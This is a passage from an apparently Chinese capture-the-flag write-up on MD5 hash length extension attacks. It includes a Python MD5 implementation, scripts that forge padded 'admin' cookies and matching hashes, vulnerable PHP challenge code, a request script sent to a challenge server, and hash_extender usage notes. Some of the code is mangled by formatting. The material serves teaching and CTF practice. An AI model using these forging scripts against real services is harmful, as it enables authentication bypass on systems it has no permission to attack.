input_msg]<br>    length_msg_bytes = len(ascii_list)<br>    length_msg_bits = len(ascii_list)<em><span class="hljs-number">8</span><br>    <span class="hljs-comment">#padding</span><br>    ascii_list.append(<span class="hljs-string">‘80’</span>)<br>    <span class="hljs-keyword">while</span> (len(ascii_list)</em><span class="hljs-number">8</span>+<span class="hljs-number">64</span>)%<span class="hljs-number">512</span> != <span class="hljs-number">0</span>:<br>        ascii_list.append(<span class="hljs-string">‘00’</span>)<br>    <span class="hljs-comment">#add Descriptor</span><br>    ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits)))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">“”</span>.join(ascii_list)<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM16</span><span class="hljs-params">(hex_str,operatingBlockNum)</span>:</span><br>    <span class="hljs-string">‘’’<br>    –args:<br>            hex_str : a hex-encoded string with length in integral multiple of 512bits<br>            operatingBlockNum : message block number which is being operated , greater than 1<br>    –return:<br>            M : result of splited 64bytes into 4<em>16 message blocks with little-endian<br><br>    ‘’’</em></span><br>    M = [int(reverse_hex_4bytes(hex_str[i:(i+<span class="hljs-number">8</span>)]),<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">128</span>(operatingBlockNum-<span class="hljs-number">1</span>),<span class="hljs-number">128</span><em>operatingBlockNum,<span class="hljs-number">8</span>)]<br>    <span class="hljs-keyword">return</span> M<br><br><span class="hljs-comment">#定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要&amp;0xffffffff操作。注意返回的是十进制的数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">T</span><span class="hljs-params">(i)</span>:</span><br>    result = (int(<span class="hljs-number">4294967296</span></em>abs(<strong>import</strong>(<span class="hljs-string">“math”</span>).sin(i))))&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment">#定义每轮中用到的函数</span><br><span class="hljs-comment">#RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位</span><br>F = <span class="hljs-keyword">lambda</span> x,y,z:((x&amp;y)|((~x)&amp;z))<br>G = <span class="hljs-keyword">lambda</span> x,y,z:((x&amp;z)|(y&amp;(~z)))<br>H = <span class="hljs-keyword">lambda</span> x,y,z:(x^y^z)<br>I = <span class="hljs-keyword">lambda</span> x,y,z:(y^(x|(~z)))<br>RL = L = <span class="hljs-keyword">lambda</span> x,n:(((x&lt;&lt;n)|(x&gt;&gt;(<span class="hljs-number">32</span>-n)))&amp;(<span class="hljs-number">0xffffffff</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">FF</span><span class="hljs-params">(a, b, c, d, x, s, ac)</span>:</span><br>    a = (a+F ((b), (c), (d)) + (x) + (ac)&amp;<span class="hljs-number">0xffffffff</span>)&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = RL ((a), (s))&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = (a+b)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> a<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GG</span><span class="hljs-params">(a, b, c, d, x, s, ac)</span>:</span><br>    a = (a+G ((b), (c), (d)) + (x) + (ac)&amp;<span class="hljs-number">0xffffffff</span>)&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = RL ((a), (s))&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = (a+b)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> a<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">HH</span><span class="hljs-params">(a, b, c, d, x, s, ac)</span>:</span><br>    a = (a+H ((b), (c), (d)) + (x) + (ac)&amp;<span class="hljs-number">0xffffffff</span>)&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = RL ((a), (s))&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = (a+b)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> a<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">II</span><span class="hljs-params">(a, b, c, d, x, s, ac)</span>:</span><br>    a = (a+I ((b), (c), (d)) + (x) + (ac)&amp;<span class="hljs-number">0xffffffff</span>)&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = RL ((a), (s))&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = (a+b)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_md5</span><span class="hljs-params">(A,B,C,D)</span>:</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">“”</span>.join( [  <span class="hljs-string">“”</span>.join(<strong>import</strong>(<span class="hljs-string">“re”</span>).findall(<span class="hljs-string">r”..”</span>,<span class="hljs-string">“%08x”</span>%i)[::-<span class="hljs-number">1</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (A,B,C,D)  ]  )<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_md5</span><span class="hljs-params">(A=<span class="hljs-number">0x67452301</span>,B=<span class="hljs-number">0xefcdab89</span>,C=<span class="hljs-number">0x98badcfe</span>,D=<span class="hljs-number">0x10325476</span>,readyMsg=<span class="hljs-string">“”</span>)</span>:</span><br><br>    a = A<br>    b = B<br>    c = C<br>    d = D<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>,len(readyMsg)/<span class="hljs-number">128</span>):<br>        M = getM16(readyMsg,i+<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">exec</span> <span class="hljs-string">“M”</span>+str(i)+<span class="hljs-string">“=M[“</span>+str(i)+<span class="hljs-string">“]”</span><br>        <span class="hljs-comment">#First round</span><br>        a=FF(a,b,c,d,M0,<span class="hljs-number">7</span>,<span class="hljs-number">0xd76aa478L</span>)<br>        d=FF(d,a,b,c,M1,<span class="hljs-number">12</span>,<span class="hljs-number">0xe8c7b756L</span>)<br>        c=FF(c,d,a,b,M2,<span class="hljs-number">17</span>,<span class="hljs-number">0x242070dbL</span>)<br>        b=FF(b,c,d,a,M3,<span class="hljs-number">22</span>,<span class="hljs-number">0xc1bdceeeL</span>)<br>        a=FF(a,b,c,d,M4,<span class="hljs-number">7</span>,<span class="hljs-number">0xf57c0fafL</span>)<br>        d=FF(d,a,b,c,M5,<span class="hljs-number">12</span>,<span class="hljs-number">0x4787c62aL</span>)<br>        c=FF(c,d,a,b,M6,<span class="hljs-number">17</span>,<span class="hljs-number">0xa8304613L</span>)<br>        b=FF(b,c,d,a,M7,<span class="hljs-number">22</span>,<span class="hljs-number">0xfd469501L</span>)<br>        a=FF(a,b,c,d,M8,<span class="hljs-number">7</span>,<span class="hljs-number">0x698098d8L</span>)<br>        d=FF(d,a,b,c,M9,<span class="hljs-number">12</span>,<span class="hljs-number">0x8b44f7afL</span>)<br>        c=FF(c,d,a,b,M10,<span class="hljs-number">17</span>,<span class="hljs-number">0xffff5bb1L</span>)<br>        b=FF(b,c,d,a,M11,<span class="hljs-number">22</span>,<span class="hljs-number">0x895cd7beL</span>)<br>        a=FF(a,b,c,d,M12,<span class="hljs-number">7</span>,<span class="hljs-number">0x6b901122L</span>)<br>        d=FF(d,a,b,c,M13,<span class="hljs-number">12</span>,<span class="hljs-number">0xfd987193L</span>)<br>        c=FF(c,d,a,b,M14,<span class="hljs-number">17</span>,<span class="hljs-number">0xa679438eL</span>)<br>        b=FF(b,c,d,a,M15,<span class="hljs-number">22</span>,<span class="hljs-number">0x49b40821L</span>)<br>        <span class="hljs-comment">#Second round</span><br>        a=GG(a,b,c,d,M1,<span class="hljs-number">5</span>,<span class="hljs-number">0xf61e2562L</span>)<br>        d=GG(d,a,b,c,M6,<span class="hljs-number">9</span>,<span class="hljs-number">0xc040b340L</span>)<br>        c=GG(c,d,a,b,M11,<span class="hljs-number">14</span>,<span class="hljs-number">0x265e5a51L</span>)<br>        b=GG(b,c,d,a,M0,<span class="hljs-number">20</span>,<span class="hljs-number">0xe9b6c7aaL</span>)<br>        a=GG(a,b,c,d,M5,<span class="hljs-number">5</span>,<span class="hljs-number">0xd62f105dL</span>)<br>        d=GG(d,a,b,c,M10,<span class="hljs-number">9</span>,<span class="hljs-number">0x02441453L</span>)<br>        c=GG(c,d,a,b,M15,<span class="hljs-number">14</span>,<span class="hljs-number">0xd8a1e681L</span>)<br>        b=GG(b,c,d,a,M4,<span class="hljs-number">20</span>,<span class="hljs-number">0xe7d3fbc8L</span>)<br>        a=GG(a,b,c,d,M9,<span class="hljs-number">5</span>,<span class="hljs-number">0x21e1cde6L</span>)<br>        d=GG(d,a,b,c,M14,<span class="hljs-number">9</span>,<span class="hljs-number">0xc33707d6L</span>)<br>        c=GG(c,d,a,b,M3,<span class="hljs-number">14</span>,<span class="hljs-number">0xf4d50d87L</span>)<br>        b=GG(b,c,d,a,M8,<span class="hljs-number">20</span>,<span class="hljs-number">0x455a14edL</span>)<br>        a=GG(a,b,c,d,M13,<span class="hljs-number">5</span>,<span class="hljs-number">0xa9e3e905L</span>)<br>        d=GG(d,a,b,c,M2,<span class="hljs-number">9</span>,<span class="hljs-number">0xfcefa3f8L</span>)<br>        c=GG(c,d,a,b,M7,<span class="hljs-number">14</span>,<span class="hljs-number">0x676f02d9L</span>)<br>        b=GG(b,c,d,a,M12,<span class="hljs-number">20</span>,<span class="hljs-number">0x8d2a4c8aL</span>)<br>        <span class="hljs-comment">#Third round</span><br>        a=HH(a,b,c,d,M5,<span class="hljs-number">4</span>,<span class="hljs-number">0xfffa3942L</span>)<br>        d=HH(d,a,b,c,M8,<span class="hljs-number">11</span>,<span class="hljs-number">0x8771f681L</span>)<br>        c=HH(c,d,a,b,M11,<span class="hljs-number">16</span>,<span class="hljs-number">0x6d9d6122L</span>)<br>        b=HH(b,c,d,a,M14,<span class="hljs-number">23</span>,<span class="hljs-number">0xfde5380c</span>)<br>        a=HH(a,b,c,d,M1,<span class="hljs-number">4</span>,<span class="hljs-number">0xa4beea44L</span>)<br>        d=HH(d,a,b,c,M4,<span class="hljs-number">11</span>,<span class="hljs-number">0x4bdecfa9L</span>)<br>        c=HH(c,d,a,b,M7,<span class="hljs-number">16</span>,<span class="hljs-number">0xf6bb4b60L</span>)<br>        b=HH(b,c,d,a,M10,<span class="hljs-number">23</span>,<span class="hljs-number">0xbebfbc70L</span>)<br>        a=HH(a,b,c,d,M13,<span class="hljs-number">4</span>,<span class="hljs-number">0x289b7ec6L</span>)<br>        d=HH(d,a,b,c,M0,<span class="hljs-number">11</span>,<span class="hljs-number">0xeaa127faL</span>)<br>        c=HH(c,d,a,b,M3,<span class="hljs-number">16</span>,<span class="hljs-number">0xd4ef3085L</span>)<br>        b=HH(b,c,d,a,M6,<span class="hljs-number">23</span>,<span class="hljs-number">0x04881d05L</span>)<br>        a=HH(a,b,c,d,M9,<span class="hljs-number">4</span>,<span class="hljs-number">0xd9d4d039L</span>)<br>        d=HH(d,a,b,c,M12,<span class="hljs-number">11</span>,<span class="hljs-number">0xe6db99e5L</span>)<br>        c=HH(c,d,a,b,M15,<span class="hljs-number">16</span>,<span class="hljs-number">0x1fa27cf8L</span>)<br>        b=HH(b,c,d,a,M2,<span class="hljs-number">23</span>,<span class="hljs-number">0xc4ac5665L</span>)<br>        <span class="hljs-comment">#Fourth round</span><br>        a=II(a,b,c,d,M0,<span class="hljs-number">6</span>,<span class="hljs-number">0xf4292244L</span>)<br>        d=II(d,a,b,c,M7,<span class="hljs-number">10</span>,<span class="hljs-number">0x432aff97L</span>)<br>        c=II(c,d,a,b,M14,<span class="hljs-number">15</span>,<span class="hljs-number">0xab9423a7L</span>)<br>        b=II(b,c,d,a,M5,<span class="hljs-number">21</span>,<span class="hljs-number">0xfc93a039L</span>)<br>        a=II(a,b,c,d,M12,<span class="hljs-number">6</span>,<span class="hljs-number">0x655b59c3L</span>)<br>        d=II(d,a,b,c,M3,<span class="hljs-number">10</span>,<span class="hljs-number">0x8f0ccc92L</span>)<br>        c=II(c,d,a,b,M10,<span class="hljs-number">15</span>,<span class="hljs-number">0xffeff47dL</span>)<br>        b=II(b,c,d,a,M1,<span class="hljs-number">21</span>,<span class="hljs-number">0x85845dd1L</span>)<br>        a=II(a,b,c,d,M8,<span class="hljs-number">6</span>,<span class="hljs-number">0x6fa87e4fL</span>)<br>        d=II(d,a,b,c,M15,<span class="hljs-number">10</span>,<span class="hljs-number">0xfe2ce6e0L</span>)<br>        c=II(c,d,a,b,M6,<span class="hljs-number">15</span>,<span class="hljs-number">0xa3014314L</span>)<br>        b=II(b,c,d,a,M13,<span class="hljs-number">21</span>,<span class="hljs-number">0x4e0811a1L</span>)<br>        a=II(a,b,c,d,M4,<span class="hljs-number">6</span>,<span class="hljs-number">0xf7537e82L</span>)<br>        d=II(d,a,b,c,M11,<span class="hljs-number">10</span>,<span class="hljs-number">0xbd3af235L</span>)<br>        c=II(c,d,a,b,M2,<span class="hljs-number">15</span>,<span class="hljs-number">0x2ad7d2bbL</span>)<br>        b=II(b,c,d,a,M9,<span class="hljs-number">21</span>,<span class="hljs-number">0xeb86d391L</span>)<br><br><br>        A += a<br>        B += b<br>        C += c<br>        D += d<br><br>        A = A&amp;<span class="hljs-number">0xffffffff</span><br>        B = B&amp;<span class="hljs-number">0xffffffff</span><br>        C = C&amp;<span class="hljs-number">0xffffffff</span><br>        D = D&amp;<span class="hljs-number">0xffffffff</span><br><br>        a = A<br>        b = B<br>        c = C<br>        d = D<br><br>    <span class="hljs-keyword">return</span> show_md5(a,b,c,d)</code></pre><br><h2 id="0x2-计算脚本">0x2 计算脚本</h2><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -<em>- coding: utf-8 -</em>-</span><br><span class="hljs-comment"># @Author：DshtAnger</span><br><span class="hljs-keyword">import</span> my_md5<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes, bytes_to_long<br><span class="hljs-comment">#reference:</span><br><span class="hljs-comment">#   <a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/69264.html</a></span><br><span class="hljs-comment">#problem link:</span><br><span class="hljs-comment">#   <a href="http://ctf4.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">http://ctf4.shiyanbar.com/web/kzhan.php</a></span><br>samplehash=<span class="hljs-string">“ec82a52bac65135157dfa73daa3548b1”</span><br><br><span class="hljs-string">‘’’<br>res = re.findall(‘.{8}’,samplehash)<br>print res<br><br>s = ‘03194d72’<br>print c<br>s1 = “”<br>print s1.join([s[i-2]+s[i-1] for i in xrange(len(s),0,-2)])<br>‘’’</span><br>s =[]<br>res = re.findall(<span class="hljs-string">‘.{8}’</span>,samplehash)<br><span class="hljs-keyword">print</span> res<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    ss = <span class="hljs-string">“”</span><br><br>    ss = ss.join([i[j-<span class="hljs-number">2</span>]+i[j-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(len(i),<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>)])<br><br>    s.append(bytes_to_long(binascii.a2b_hex(ss)))<br><span class="hljs-keyword">print</span> [hex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]<br><span class="hljs-comment"># 084e0343 a0486ff0 5530df6c 705c8bb4</span><br><span class="hljs-comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span><br><br>s1=s[<span class="hljs-number">0</span>]<br>s2=s[<span class="hljs-number">1</span>]<br>s3=s[<span class="hljs-number">2</span>]<br>s4=s[<span class="hljs-number">3</span>]<br><span class="hljs-comment">#exp</span><br>secret = <span class="hljs-string">“a”</span><em><span class="hljs-number">15</span><br>secret_admin=<span class="hljs-string">“xxxxxguest”</span>+<span class="hljs-string">‘\x80’</span>+<span class="hljs-string">‘\x00’</span></em><span class="hljs-number">45</span>+<span class="hljs-string">‘\x50’</span>+<span class="hljs-string">‘\x00’</span><em><span class="hljs-number">7</span>+<span class="hljs-string">“admin”</span><br>r = my_md5.deal_rawInputMsg(secret_admin)<br>inp = r[len(r)/<span class="hljs-number">2</span>:]      <span class="hljs-comment">#我们需要截断的地方，也是我们需要控制的地方</span><br><span class="hljs-comment">#print r</span><br><span class="hljs-comment">#print inp</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">“getmein:”</span>+my_md5.run_md5(s1,s2,s3,s4,inp)<br><span class="hljs-keyword">print</span> <span class="hljs-string">“getmein:”</span>+hashlib.md5(secret_admin).hexdigest()</em></code></pre><br><h1 id="0x03-实例演示">0x03 实例演示</h1><br><h2 id="0x1-简单实例">0x1 简单实例</h2><br><pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span><br><span class="hljs-variable">$SECRET</span>=<span class="hljs-string">“xxxxx”</span>;<br><span class="hljs-variable">$auth</span> = <span class="hljs-string">“guest”</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“auth”</span>])) {<br>    <span class="hljs-variable">$hsh</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“hsh”</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$hsh</span> === md5(<span class="hljs-variable">$SECRET</span> . <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“auth”</span>])) {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">“flag{I_L0vE_L0li}”</span>);<br>    }<br>} <span class="hljs-keyword">else</span> {<br>    setcookie(<span class="hljs-string">“auth”</span>, <span class="hljs-variable">$auth</span>);<br>    setcookie(<span class="hljs-string">“hsh”</span>, md5(<span class="hljs-variable">$SECRET</span>.<span class="hljs-variable">$auth</span>));<br>}<br><span class="hljs-preprocessor">?&gt;</span></span></code></pre><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170704005525497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -- coding: utf-8 -<em>-</em></span><br><span class="hljs-comment"># @Author：DshtAnger</span><br><span class="hljs-keyword">import</span> my_md5<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes, bytes_to_long<br><span class="hljs-comment">#reference:</span><br><span class="hljs-comment">#   <a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/69264.html</a></span><br><span class="hljs-comment">#problem link:</span><br><span class="hljs-comment">#   <a href="http://ctf4.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">http://ctf4.shiyanbar.com/web/kzhan.php</a></span><br>samplehash=<span class="hljs-string">“06be518adbb45a90440c98bb364d4cf8”</span><br><br><span class="hljs-string">‘’’<br>res = re.findall(‘.{8}’,samplehash)<br>print res<br><br>s = ‘03194d72’<br>print c<br>s1 = “”<br>print s1.join([s[i-2]+s[i-1] for i in xrange(len(s),0,-2)])<br>‘’’</span><br>s =[]<br>res = re.findall(<span class="hljs-string">‘.{8}’</span>,samplehash)<br><span class="hljs-keyword">print</span> res<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    ss = <span class="hljs-string">“”</span><br><br>    ss = ss.join([i[j-<span class="hljs-number">2</span>]+i[j-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(len(i),<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>)])<br><br>    s.append(bytes_to_long(binascii.a2b_hex(ss)))<br><span class="hljs-keyword">print</span> [hex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]<br><span class="hljs-comment"># 084e0343 a0486ff0 5530df6c 705c8bb4</span><br><span class="hljs-comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span><br><br>s1=s[<span class="hljs-number">0</span>]<br>s2=s[<span class="hljs-number">1</span>]<br>s3=s[<span class="hljs-number">2</span>]<br>s4=s[<span class="hljs-number">3</span>]<br><span class="hljs-comment">#exp</span><br>secret = <span class="hljs-string">“a”</span><span class="hljs-number">15</span><br>secret_admin=<span class="hljs-string">“yyyyyyyyzzzzzzzadminadmin”</span>+<span class="hljs-string">‘\x80’</span>+<span class="hljs-string">‘\x00’</span><em><span class="hljs-number">30</span>+<span class="hljs-string">‘\xc8’</span>+<span class="hljs-string">‘\x00’</span></em><span class="hljs-number">7</span>+<span class="hljs-string">“admin”</span><br>r = my_md5.deal_rawInputMsg(secret_admin)<br>inp = r[len(r)/<span class="hljs-number">2</span>:]      <span class="hljs-comment">#我们需要截断的地方，也是我们需要控制的地方</span><br><span class="hljs-comment">#print r</span><br><span class="hljs-comment">#print inp</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">“getmein:”</span>+my_md5.run_md5(s1,s2,s3,s4,inp)<br><span class="hljs-keyword">print</span> <span class="hljs-string">“getmein:”</span>+hashlib.md5(secret_admin).hexdigest()</code></pre><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170704011612940?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>自己写个访问脚本就可以获取flag<br></p><br><pre class="prettyprint"><code class=" hljs ruby">import requests<br>se = requests.session()<br>cookies = {<br>    <span class="hljs-string">‘hsh’</span><span class="hljs-symbol">:<span class="hljs-string">‘9b012140133ad92facec4f297bcd2d92’</span></span>,<br>    <span class="hljs-string">‘auth’</span><span class="hljs-symbol">:<span class="hljs-string">“admin”</span>+<span class="hljs-string">‘\x80’</span>+<span class="hljs-string">‘\x00’</span><em></em></span><span class="hljs-number">30</span>+<span class="hljs-string">‘\xc8’</span>+<span class="hljs-string">‘\x00’</span><span class="hljs-number">7</span>+<span class="hljs-string">“admin”</span><br>}<br>re = se.post(url=<span class="hljs-string">“<a href="http://45.78.29.252/hash.php" target="_blank" rel="external">http://45.78.29.252/hash.php</a>“</span>,cookies=cookies)<br>print re.content<br></code></pre><br><p>当然也可以直接用burp</p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170704012700711?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h2 id="0x2-jarvisoj-flag在管理员手里">0x2 jarvisoj flag在管理员手里</h2><br><p>首先我介绍一个开源工具<a href="https://github.com/iagox86/hash_extender" target="_blank" rel="external">hash_extender</a> <br><br>具体的使用方法我这里就不在介绍了 主要介绍一下使用参数<br></p><br><pre class="prettyprint"><code class=" hljs haml">-<span class="ruby">d 被扩展的明文<br></span>-<span class="ruby">a 附加的到原来hash的padding<br></span>-<span class="ruby">l 盐的长度<br></span>-<span class="ruby">f 加密方式<br></span>-<span class="ruby">s 带盐加密的hash值<br></span>-<span class="ruby">-out-data-format 输出格式<br></span>-<span class="ruby">-quiet 仅输出必要的值</span></code></pre><br><p>题目中有备份文件泄露所以 <br><br>利用vim恢复一下方法是，首先重命名为.index.php.swp,接着利用vim -r index.php即可恢复 <br><br>源码如下<br><br></p><br><pre class="prettyprint"><code class=" hljs handlebars"><span class="xml"><span class="hljs-doctype">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">title</span>&gt;</span>Web 350<span class="hljs-tag">&lt;/<span class="hljs-title">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">style</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">“text/css”</span>&gt;</span><span class="css"><br>    <span class="hljs-tag">body</span> <span class="hljs-rules">{<br>        <span class="hljs-rule"><span class="hljs-attribute">background</span>:<span class="hljs-value">gray</span></span>;<br>        <span class="hljs-rule"><span class="hljs-attribute">text-align</span>:<span class="hljs-value">center</span></span>;<br>    <span class="hljs-rule">}</span></span><br></span><span class="hljs-tag">&lt;/<span class="hljs-title">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-title">body</span>&gt;</span><br>    <span class="php"><span class="hljs-preprocessor">&lt;?php</span><br>        <span class="hljs-variable">$auth</span> = <span class="hljs-keyword">false</span>;<br>        <span class="hljs-variable">$role</span> = <span class="hljs-string">“guest”</span>;<br>        <span class="hljs-variable">$salt</span> =<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“role”</span>])) {<br>            <span class="hljs-variable">$role</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“role”</span>]);<br>            <span class="hljs-variable">$hsh</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“hsh”</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$role</span>===<span class="hljs-string">“admin”</span> &amp;&amp; <span class="hljs-variable">$hsh</span> === md5(<span class="hljs-variable">$salt</span>.strrev(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“role”</span>]))) {<br>                <span class="hljs-variable">$auth</span> = <span class="hljs-keyword">true</span>;<br>            } <span class="hljs-keyword">else</span> {<br>                <span class="hljs-variable">$auth</span> = <span class="hljs-keyword">false</span>;<br>            }<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-variable">$s</span> = serialize(<span class="hljs-variable">$role</span>);<br>            setcookie(<span class="hljs-string">‘role’</span>,<span class="hljs-variable">$s</span>);<br>            <span class="hljs-variable">$hsh</span> = md5(<span class="hljs-variable">$salt</span>.strrev(<span class="hljs-variable">$s</span>));<br>            setcookie(<span class="hljs-string">‘hsh’</span>,<span class="hljs-variable">$hsh</span>);<br>        }<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$auth</span>) {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">“&lt;h3&gt;Welcome Admin. Your flag is<br>        } else {<br>            echo “</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="hljs-string">“;<br>        }<br>    ?&gt;</span></span><br><br><span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span><br></span></code></pre><br><h3 id="方法一-利用hashextender">方法一 利用hash_extender</h3><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment"># -<em>- coding:utf-8 -</em>-</span><br><span class="hljs-keyword">from</span> urlparse <span class="hljs-keyword">import</span> urlparse<br><span class="hljs-keyword">from</span> httplib <span class="hljs-keyword">import</span> HTTPConnection<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> urlencode<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gao</span><span class="hljs-params">(x, y)</span>:</span><br>        <span class="hljs-comment">#print x</span><br>        <span class="hljs-comment">#print y</span><br>    url = <span class="hljs-string">“<a href="http://120.26.131.152:32778/" target="_blank" rel="external">http://120.26.131.152:32778/</a>“</span><br>    cookie = <span class="hljs-string">“role=”</span> + x + <span class="hljs-string">“; hsh=”</span> + y<br>        <span class="hljs-comment">#print cookie</span><br>    build_header = {<br>            <span class="hljs-string">‘Cookie’</span>: cookie,<br>            <span class="hljs-string">‘User-Agent’</span>: <span class="hljs-string">‘Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0’</span>,<br>            <span class="hljs-string">‘Host’</span>: <span class="hljs-string">‘web.phrack.top:32785’</span>,<br>            <span class="hljs-string">‘Accept’</span>: <span class="hljs-string">‘text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8’</span>,<br>    }<br>    urlparts = urlparse(url)<br>    conn = HTTPConnection(urlparts.hostname, urlparts.port <span class="hljs-keyword">or</span> <span class="hljs-number">80</span>)<br>    conn.request(<span class="hljs-string">“GET”</span>, urlparts.path, <span class="hljs-string">‘’</span>, build_header)<br>    resp = conn.getresponse()<br>    body = resp.read()<br>    <span class="hljs-keyword">return</span> body<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1000</span>):<br>    <span 